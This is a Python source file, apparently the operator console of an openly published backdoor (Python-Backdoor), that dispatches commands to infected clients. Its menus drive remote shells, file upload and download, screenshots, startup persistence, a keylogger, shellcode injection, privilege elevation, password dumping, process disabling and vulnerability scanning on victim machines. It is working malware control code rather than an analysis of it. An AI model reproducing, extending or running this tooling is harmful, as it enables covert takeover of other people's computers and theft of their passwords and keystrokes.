"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import socket

from cryptography.fernet import InvalidToken

from src.definitions.commands import *
from src.definitions import platforms


def menu_help(_list, _platform=platforms.UNKNOWN):
    out = ""

    for i in range(0, len(_list)):

        if "platform" in _list[i] and _list[i]["platform"] == "windows" and _platform != platforms.WINDOWS:
            continue

        out += f"{_list[i]['arg']} {_list[i]['info']}"

        if "arg2" in _list[i]:
            out += f" <{_list[i]['arg2']}>"

        if "optional_arg2" in _list[i]:
            out += f" [{_list[i]['optional_arg2']}]"

        if "optional_arg3" in _list[i]:
            out += f" [{_list[i]['optional_arg3']}]"

        if "note" in _list[i]:
            out += f" {_list[i]['note']}"

        if i != len(_list) - 1:
            out += "\n"

    print(f"\n{out}")


def _input(prompt):
    choice = input(prompt).rstrip()

    if choice == "":
        return choice

    choice = choice.split(" ")

    choice[0] = choice[0].upper()

    if len(choice) > 1:
        choice[1] = choice[1].lower()

    return choice


class View:
    def __init__(self, control):
        self.control = control
        self.main_menu()

    def check_input(self, _input, _list, _platform=platforms.UNKNOWN):
        for arg in _list:
            if _input[0] == arg["arg"]:
                if "arg2" in arg and len(_input) < 2:
                    self.control.logger.error(f"Missing argument: {arg['arg2']}")
                    return False
                elif "platform" in arg and arg["platform"] == "windows" and _platform != platforms.WINDOWS:
                    self.control.logger.error(f"Command '{_input[0]}' is only supported with windows clients")
                    return False

                return True
        self.control.logger.error(f"Command '{_input[0]}' not found, type {MENU_HELP} for Help")
        return False

    def main_menu(self):
        while True:
            try:
                choice = _input(">> ")

                self.control.server.refresh()

                if choice == "":
                    continue

                if self.check_input(choice, SERVER_MAIN_COMMAND_LIST):
                    if choice[0] == MENU_HELP:
                        menu_help(SERVER_MAIN_COMMAND_LIST)

                    elif choice[0] == MENU_LIST_CONNECTIONS:
                        if len(choice) > 1:
                            if choice[1] == MENU_LIST_CONNECTIONS_INACTIVE:
                                print(self.control.server.list(True))
                            else:
                                self.control.logger.error("Invalid argument")
                        else:
                            print(self.control.server.list())

                    elif choice[0] == MENU_SEND_ALL_CMD:
                        self.control.server.send_all_connections(CLIENT_RUN_CMD, choice[1], recvall=True)
                    elif choice[0] == MENU_INTERACT:
                        if self.control.interact(choice[1]):
                            self.interact_menu()
                    elif choice[0] == MENU_CLOSE_CONNECTION:
                        self.control.server.close_one(index=choice[1])
                    elif choice[0] == MENU_CLOSE_ALL:
                        self.control.server.close_clients()
                    elif choice[0] == MENU_OPEN_SHELL:
                        self.control.command_shell(choice[1])
                    print()
            except ConnectionAbortedError as e:
                self.control.logger.error(str(e))

    def interact_menu(self):
        _platform = platforms.UNIX if self.control.server.get_address(self.control.es.socket)['is_unix'] else platforms.WINDOWS

        try:
            while True:
                choice = _input("interact>> ")

                self.control.server.refresh()

                if choice == "":
                    continue

                if self.check_input(choice, SERVER_INTERACT_COMMAND_LIST, _platform):
                    if choice[0] == MENU_HELP:
                        menu_help(SERVER_INTERACT_COMMAND_LIST, _platform)
                    elif choice[0] == MENU_INTERACT_UPLOAD:
                        self.control.upload_file()

                    elif choice[0] == MENU_INTERACT_DWNL:
                        if choice[1] == MENU_INTERACT_DWNL_DIR:
                            self.control.download_dir()
                        elif choice[1] == MENU_INTERACT_DWNL_FILE:
                            self.control.download_file()
                        else:
                            self.control.logger.error("Invalid argument")

                    elif choice[0] == MENU_INTERACT_SCRN:
                        self.control.screenshot()

                    elif choice[0] == MENU_INTERACT_STARTUP:
                        if choice[1] == MENU_INTERACT_STARTUP_ADD:
                            self.control.startup()
                        elif choice[1] == MENU_INTERACT_STARTUP_RMV:
                            self.control.startup(True)
                        else:
                            self.control.logger.error("Invalid argument")

                    elif choice[0] == MENU_INTERACT_INFO:
                        self.control.info()
                    elif choice[0] == MENU_INTERACT_SHELL:
                        self.control.command_shell()
                    elif choice[0] == MENU_INTERACT_PYTHON:
                        self.control.python_interpreter()

                    elif choice[0] == MENU_INTERACT_KEYLOG:
                        if choice[1] == MENU_INTERACT_KEYLOG_START:
                            self.control.keylogger_start()
                        elif choice[1] == MENU_INTERACT_KEYLOG_STOP:
                            self.control.keylogger_stop()
                        elif choice[1] == MENU_INTERACT_KEYLOG_DUMP:
                            self.control.keylogger_dump()
                        else:
                            self.control.logger.error("Invalid argument")

                    elif choice[0] == MENU_INTERACT_DISABLE_PROCESS:
                        self.control.toggle_disable_process(choice[1], True if len(choice) > 2 and choice[
                            2] == MENU_INTERACT_DISABLE_PROCESS_POPUP else False)
                    elif choice[0] == MENU_INTERACT_LOCK:
                        self.control.lock()
                    elif choice[0] == MENU_INTERACT_BACKGROUND:
                        self.control.es = None
                        break
                    elif choice[0] == MENU_INTERACT_CLOSE:
                        self.control.close()
                        break
                    elif choice[0] == MENU_INTERACT_SHELLCODE:
                        self.control.shellcode()
                    elif choice[0] == MENU_INTERACT_ELEVATE:
                        self.control.elevate()
                    elif choice[0] == MENU_INTERACT_PWD:
                        self.control.password_dump(choice[1] if len(choice) > 1 else None)

                    elif choice[0] == MENU_INTERACT_VULN:
                        # exploit-only is windows only, since linux only shows exploits
                        if len(choice) > 1 and _platform == platforms.WINDOWS:
                            if choice[1] == MENU_INTERACT_VULN_EXP_ONLY:
                                self.control.get_vuln(True)
                            else:
                                self.control.logger.error("Invalid argument")
                        else:
                            self.control.get_vuln(False)

                    print()
        except socket.error:  # if there is a socket error
            self.control.logger.error(f"Connection was lost")
        except InvalidToken:
            self.control.logger.error(f"Connection lost (invalid crypto token)")
